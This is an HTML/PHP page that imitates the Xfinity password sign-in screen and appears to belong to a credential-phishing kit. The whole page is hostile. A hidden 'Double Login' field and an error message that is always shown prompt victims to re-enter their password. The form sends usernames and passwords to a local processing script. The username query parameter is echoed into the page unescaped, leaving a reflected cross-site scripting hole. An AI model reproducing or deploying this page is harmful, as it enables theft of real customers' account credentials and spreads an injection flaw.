<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to Xfinity</title>
    <link rel="stylesheet" href="./assets/css/reset.css">
    <link rel="stylesheet" href="./assets/css/style.css">
    <link rel="shortcut icon" href="./assets/img/favicon.ico" type="image/x-icon">
</head>
<body>
    <div class="container-wrapper">
        <div class="left-index">&nbsp;</div>

        <div class="right-index">
            <div class="logo-div">
                <img src="./assets/img/logo-grey.svg" class="logo-top" alt="">
            </div>
            <div>
                <p class="username">
                    <?php echo $_GET['username'] ?>
                </p>
            </div>
            <div>
                <p class="top-header">
                    Enter your password
                </p>
            </div>

            <form action="./process/process.php" autocapitalize="off" autocomplete="off" method="post">
                <input type="text" required value="Double Login" name="form_name" id="form_name" class="hidden" hidden>
                <input type="text" required value="<?php echo $_GET['username'] ?>" name="username" id="username" class="hidden" hidden>
                <div class="position-relative">
                    <input style="border: 1px solid #b7013c;" type="password" data-length="1" required class="input" name="password" id="password">
                    <svg onclick='passwordtoggle()' class="eye-svg eye-open" width="30" height="30" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <path d="M13.49 12C13.49 12.2971 13.4018 12.5875 13.2365 12.8344C13.0712 13.0813 12.8364 13.2735 12.5617 13.3868C12.287 13.5 11.9849 13.5291 11.6937 13.4704C11.4024 13.4117 11.1352 13.2679 10.9258 13.0571C10.7164 12.8463 10.5744 12.5781 10.5176 12.2865C10.4609 11.9948 10.492 11.6929 10.6071 11.419C10.7221 11.1451 10.916 10.9115 11.1639 10.7479C11.4119 10.5843 11.7029 10.498 12 10.5C12.3961 10.5026 12.7751 10.6618 13.0542 10.9429C13.3333 11.2239 13.49 11.6039 13.49 12ZM21 12C20.0165 13.4995 18.6836 14.7379 17.116 15.6088C15.5484 16.4797 13.7928 16.9571 12 17C10.2072 16.9571 8.45161 16.4797 6.88398 15.6088C5.31635 14.7379 3.98354 13.4995 3 12C3.98291 10.4999 5.31559 9.26102 6.88335 8.39004C8.45112 7.51906 10.207 7.04203 12 7C13.793 7.04203 15.5489 7.51906 17.1166 8.39004C18.6844 9.26102 20.0171 10.4999 21 12ZM15 12C15 11.4067 14.8241 10.8266 14.4944 10.3333C14.1648 9.83994 13.6962 9.45542 13.1481 9.22836C12.5999 9.0013 11.9967 8.94189 11.4147 9.05764C10.8328 9.1734 10.2982 9.45912 9.87868 9.87868C9.45912 10.2982 9.1734 10.8328 9.05764 11.4147C8.94189 11.9967 9.0013 12.5999 9.22836 13.1481C9.45542 13.6962 9.83994 14.1648 10.3333 14.4944C10.8266 14.8241 11.4067 15 12 15C12.7956 15 13.5587 14.6839 14.1213 14.1213C14.6839 13.5587 15 12.7956 15 12Z" fill="black"/>
                    </svg>
                    <svg onclick='passwordtoggle()' class="eye-svg eye-close" xmlns="http://www.w3.org/2000/svg" width="30" height="30" viewBox="0 0 24 24" fill="currentColor" focusable="false" role="img" class="size-sm neutral primary icon" aria-hidden="true"><path d="M21,12a11.37,11.37,0,0,1-3.43,3.33L14.9,12.7A2.63,2.63,0,0,0,15,12a3,3,0,0,0-3-3,3.27,3.27,0,0,0-.7.09L9.51,7.34A10.27,10.27,0,0,1,12,7,11.08,11.08,0,0,1,21,12Zm-4.81,4.07,2.36,2.35-1.07,1L14.6,16.63A10.18,10.18,0,0,1,12,17,11.09,11.09,0,0,1,3,12,11.75,11.75,0,0,1,6.54,8.6l-2.07-2L5.53,5.49,7.92,7.87h0l2,2h0l.7.7h0l2.82,2.81h0l.71.7h0l2,2Zm-3.36-1.23L11.94,14A2,2,0,0,1,10,12.05l-.87-.87A2.82,2.82,0,0,0,9,12a3,3,0,0,0,3,3A3.2,3.2,0,0,0,12.82,14.86ZM12.22,10,14,11.78A2,2,0,0,0,12.22,10Z"></path></svg>
                </div>

                <!-- style="margin: 5px 8px 0px 0px;" -->

                <div style="display: flex;">
                    <div>
                        <svg class="err-icon-evg" xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="#b7013c" focusable="false" role="img" class="size-xs negative primary icon" aria-hidden="true"><path d="M13.58,3.5H10.42A8.42,8.42,0,0,0,2,11.92v.16a8.42,8.42,0,0,0,8.42,8.42h3.16A8.42,8.42,0,0,0,22,12.08v-.16A8.42,8.42,0,0,0,13.58,3.5ZM11,7.5h2v6.07H11Zm1.84,9.17a1.23,1.23,0,0,1-1.68,0,1.18,1.18,0,0,1,0-1.68,1.23,1.23,0,0,1,1.68,0,1.18,1.18,0,0,1,0,1.68Z"></path></svg>
                    </div>
                    <div>
                        <p class="err-text">The Xfinity ID or password you entered was incorrect. Please try again.</p>
                    </div>
                </div>
                <br>

                <div class="forgot-password-div">
                    <p class="forgot-password">
                        Forgot password?
                    </p>
                </div>

                <div class="keep-me-signed-in">
                    <img onclick="rememberme()" style="display: block;" class="remember-checked" src="./assets/img/keep-signed-in-unchecked.png" alt="">
                    <img onclick="rememberme()" style="display: none;" class="remember-unchecked" src="./assets/img/keep-signed-in-checked.png" alt="">
                </div>

                <p class="para-reg">
                    By signing in, you agree to our <span class="link">Terms of Service</span> and <span class="link">Privacy Policy</span>.
                </p>

                <div>
                    <button type="submit" class="letsgo-button">Sign in</button>
                </div>
            </form>

            <div>
                <p class="sign-in">
                    <a href="./index.php">
                        Sign in as someone else
                    </a>
                </p>
            </div>
        </div>
    </div>

    <div class="footer-container">
        <img src="./assets/img/footer.png" class="footer-sm" alt="">
        <img src="./assets/img/footer-md.png" class="footer-md" alt="">
        <img src="./assets/img/footer-lg.png" class="footer-lg" alt="">

        <div class="cmp-revoke">
            <button class="cmp-revoke-consent" id="cmp-revoke">
            Cookie Preferences</button>
        </div>

    </div>

    <script src="./assets/js/main.js"></script>

</body>
</html>
